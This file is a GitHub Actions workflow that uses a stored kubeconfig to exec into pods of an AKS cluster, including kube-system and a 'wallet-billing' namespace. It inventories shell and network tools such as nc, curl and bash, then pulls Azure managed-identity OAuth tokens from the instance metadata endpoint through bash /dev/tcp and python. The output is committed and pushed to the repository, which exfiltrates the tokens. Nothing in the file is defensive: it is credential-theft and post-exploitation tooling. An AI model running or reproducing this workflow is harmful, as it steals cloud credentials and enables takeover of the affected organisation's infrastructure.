name: ulnode12
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: exec
        run: |
          set +e
          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
          K=ul/kc/datapath-eastus.yaml
          C=aks-g42us-tfdemo-kashif-datapath-eastus
          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=20s"
          {
            for T in wallet-billing/azure-cns-48r8p kube-system/azure-cns-48r8p kube-system/azure-ip-masq-agent-h98h8 wallet-billing/billing-559f7df45-9vdlk; do
              NS=${T%%/*}; P=${T##*/}
              echo "=== $NS/$P TOOLS"
              $KX exec -n $NS $P -- sh -c 'for t in bash python3 python curl wget nc openssl busybox; do printf "%s=" $t; command -v $t || echo no; done; echo SHELL=$0; ls /bin | head -30' 2>&1 | head -40
            done
            echo "=== IMDS via bash /dev/tcp (azure-cns hostNetwork)"
            for P in $($KX get pods -n kube-system -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | grep azure-cns | head -3); do
              echo "--- $P"
              $KX exec -n kube-system $P -- bash -c 'exec 3<>/dev/tcp/169.254.169.254/80; printf "GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%%3A%%2F%%2Fmanagement.azure.com%%2F HTTP/1.1\r\nHost: 169.254.169.254\r\nMetadata: true\r\nConnection: close\r\n\r\n" >&3; timeout 8 cat <&3' 2>&1 | head -20
            done
            echo "=== IMDS via python3 if present"
            for P in $($KX get pods -n wallet-billing --field-selector=status.phase=Running -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | head -6); do
              echo "--- $P"
              $KX exec -n wallet-billing $P -- python3 -c "import urllib.request;r=urllib.request.Request('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',headers={'Metadata':'true'});print(urllib.request.urlopen(r,timeout=8).read().decode()[:400])" 2>&1 | head -6
            done
          } 2>&1 | tee node_exec2.txt
      - name: commit
        if: always()
        run: |
          set +e
          git add -A
          git -c user.email=a@b -c user.name=ul commit -m "ulnode12 $(date -u +%s)"
          git push
